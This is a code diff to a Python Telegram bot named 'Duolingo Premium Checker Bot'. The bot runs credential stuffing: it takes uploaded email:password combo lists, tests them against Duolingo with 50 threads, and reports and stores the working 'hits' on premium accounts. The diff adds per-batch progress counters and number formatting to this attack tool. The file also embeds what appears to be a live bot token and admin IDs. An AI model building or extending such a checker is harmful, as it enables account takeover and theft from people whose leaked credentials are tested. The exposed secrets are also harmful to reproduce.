@@ -14,6 +14,7 @@ BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
 ADMIN_IDS = [8770379893, 1859432548]
 MAX_THREADS = 50
 BATCH_SIZE = 10000
+PROGRESS_INTERVAL = 1000  # 1000 combos per update
 # ===================================
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')
@@ -36,6 +37,12 @@ super_count = 0
 family_count = 0
 free_count = 0
 fail_count = 0
+
+# Batch stats for "Last 1000"
+last_batch_super = 0
+last_batch_family = 0
+last_batch_free = 0
+last_batch_fail = 0
 
 def is_admin(user_id):
     return user_id in ADMIN_IDS
@@ -187,7 +194,6 @@ def check_single_account(email, password):
         if invite_token:
             sub_details["invite_token"] = invite_token
         
-        # Build beautiful box UI for HIT
         if plan_type == "FAMILY":
             result = f"""
 ╔════════════════════════════════════╗
@@ -254,7 +260,6 @@ def send_main_menu(chat_id):
     total_hits = len(all_super_hits) + len(all_family_hits)
     today_hits = super_count + family_count
     
-    # Get admin name
     admin_name = "thuyaaungzaw"
     
     menu_text = f"""
@@ -308,7 +313,6 @@ def send_hits_list(chat_id, page=0):
         bot.send_message(chat_id, "📭 No premium hits yet.", parse_mode='Markdown')
         return
     
-    # Combine all hits
     all_hits = []
     for email, pwd, result in all_super_hits:
         all_hits.append(("👑 SUPER", email, pwd))
@@ -500,6 +504,7 @@ def process_combos(chat_id, combos):
     global checking_active, stop_flag, current_executor, current_futures
     global super_count, family_count, free_count, fail_count
     global all_super_hits, all_family_hits, all_free_accounts
+    global last_batch_super, last_batch_family, last_batch_free, last_batch_fail
     
     checking_active = True
     stop_flag = False
@@ -512,9 +517,16 @@ def process_combos(chat_id, combos):
     all_family_hits = []
     all_free_accounts = []
     
+    # Reset batch counters
+    last_batch_super = 0
+    last_batch_family = 0
+    last_batch_free = 0
+    last_batch_fail = 0
+    
     total = len(combos)
     completed = 0
     start_time = time.time()
+    last_update = 0
     
     status_msg = bot.send_message(chat_id, "🔄 Starting check...")
     
@@ -542,26 +554,31 @@ def process_combos(chat_id, combos):
             if status == "HIT":
                 if plan_type == "FAMILY":
                     family_count += 1
+                    last_batch_family += 1
                     all_family_hits.append((email, password, detail))
                 else:
                     super_count += 1
+                    last_batch_super += 1
                     all_super_hits.append((email, password, detail))
-                # Send HIT immediately with beautiful box UI
                 bot.send_message(chat_id, detail, parse_mode='Markdown')
                 logging.info(f"✅ HIT: {email}")
             elif status == "FREE":
                 free_count += 1
+                last_batch_free += 1
                 logging.info(f"⚠️ FREE: {email}")
             elif status == "STOPPED":
                 break
             else:
                 fail_count += 1
+                last_batch_fail += 1
                 logging.info(f"❌ FAIL: {email}")
             
-            # Update progress every 100 combos
-            if completed % 100 == 0 or completed == total:
+            # Update progress every 1000 combos
+            if completed - last_update >= PROGRESS_INTERVAL or completed == total:
+                last_update = completed
                 bar_length = int(percent / 5)
                 progress_bar = "▓" * bar_length + "░" * (20 - bar_length)
+                
                 progress_text = f"""
 ╔════════════════════════════════════╗
 ║         🦉 CHECKING STATUS         ║
@@ -569,18 +586,22 @@ def process_combos(chat_id, combos):
 
 ┌────────────────────────────────────┐
 │  ⏱️ Time     : {elapsed:.1f}s              │
-│  📍 Checked  : {completed}/{total}         │
+│  📍 Checked  : {completed:,}/{total:,}    │
 │  🚀 Threads  : {MAX_THREADS}               │
 └────────────────────────────────────┘
 
 [{progress_bar}] {percent:.1f}%
 
 ┌────────────────────────────────────┐
-│  👑 SUPER     : {super_count}              │
-│  👨‍👩‍👧 FAMILY   : {family_count}              │
-│  ⚠️ FREE      : {free_count}              │
-│  ❌ FAIL      : {fail_count}              │
+│  👑 SUPER     : {super_count:,}           │
+│  👨‍👩‍👧 FAMILY   : {family_count:,}           │
+│  ⚠️ FREE      : {free_count:,}           │
+│  ❌ FAIL      : {fail_count:,}           │
 └────────────────────────────────────┘
+
+📊 **Last {PROGRESS_INTERVAL} checked:**
+   👑 {last_batch_super} HIT  |  👨‍👩‍👧 {last_batch_family} FAMILY
+   ⚠️ {last_batch_free} FREE  |  ❌ {last_batch_fail} FAIL
 
 💡 Use /stop to cancel
 """
@@ -588,6 +609,12 @@ def process_combos(chat_id, combos):
                     bot.edit_message_text(progress_text, status_msg.message_id, chat_id, parse_mode='Markdown')
                 except:
                     pass
+                
+                # Reset batch counters
+                last_batch_super = 0
+                last_batch_family = 0
+                last_batch_free = 0
+                last_batch_fail = 0
     
     # Final summary
     elapsed = time.time() - start_time
@@ -599,18 +626,18 @@ def process_combos(chat_id, combos):
 
 ┌────────────────────────────────────┐
 │  ⏱️ Time     : {elapsed:.1f}s              │
-│  📍 Total    : {total}                    │
+│  📍 Total    : {total:,}                   │
 │  🚀 Threads  : {MAX_THREADS}               │
 └────────────────────────────────────┘
 
 ┌────────────────────────────────────┐
-│  👑 SUPER PREMIUM : {super_count}         │
-│  👨‍👩‍👧 FAMILY PLAN : {family_count}         │
-│  ⚠️ FREE ACCOUNTS : {free_count}          │
-│  ❌ FAILED       : {fail_count}           │
+│  👑 SUPER PREMIUM : {super_count:,}         │
+│  👨‍👩‍👧 FAMILY PLAN : {family_count:,}         │
+│  ⚠️ FREE ACCOUNTS : {free_count:,}          │
+│  ❌ FAILED       : {fail_count:,}           │
 └────────────────────────────────────┘
 
-💾 Total Hits: {total_hits}
+💾 Total Hits: {total_hits:,}
 
 Click 💾 HITS in main menu to view all premium accounts
 """
@@ -677,7 +704,7 @@ def handle_file(message):
         bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
         return
     
-    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...", status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
+    bot.edit_message_text(f"📥 `{len(combos):,}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...\n📊 Update every {PROGRESS_INTERVAL} combos", status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
     
     thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
     thread.daemon = True
@@ -687,6 +714,7 @@ print("🤖 Duolingo Premium Checker Bot is running...")
 print("═" * 50)
 print(f"  Admin IDs: {ADMIN_IDS}")
 print(f"  Threads: {MAX_THREADS}")
+print(f"  Progress Interval: {PROGRESS_INTERVAL} combos")
 print(f"  Features: Box UI | Inline Menu | No TXT Files")
 print("═" * 50)
 bot.infinity_polling()
